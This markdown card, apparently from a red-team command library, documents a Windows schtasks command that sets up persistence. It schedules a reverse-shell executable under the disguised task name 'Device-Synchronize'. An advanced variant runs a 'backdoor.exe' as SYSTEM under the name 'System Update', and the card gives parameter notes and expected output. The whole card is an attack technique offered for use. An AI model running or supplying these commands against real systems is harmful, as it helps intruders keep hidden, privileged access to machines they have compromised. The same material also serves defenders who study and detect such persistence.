---
type: command
executor: cmd
data: >-
  schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr
  C:\Temp\revshell.exe
output: null
platforms:
  - Windows
tags:
  - persistence
  - scheduled-task
verified: true
validated: true
---

# schtasks-create-task-once

## Command

```cmd
schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
```

## Description

Creates a one-time scheduled task to execute a payload at a specified time, useful for immediate or timed persistence.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /sc ONCE | Schedule type: run once | Yes |
| /st 00:00 | Start time in HH:MM | Yes |
| /tn "Device-Synchronize" | Task name (disguised as legit) | Yes |
| /tr C:\Temp\revshell.exe | Path to executable payload | Yes |

## Examples

### Basic Usage

```cmd
schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
```

### Advanced Usage

```cmd
schtasks /create /sc DAILY /st 09:00 /tn "System Update" /tr C:\Windows\Temp\backdoor.exe /ru SYSTEM
```

## Expected Output

SUCCESS: The scheduled task "Device-Synchronize" has successfully been created.

## Related

- [[procedures/Create-Scheduled-Task-Backdoor-for-Persistence]]
- [[commands/schtasks-run-task]]
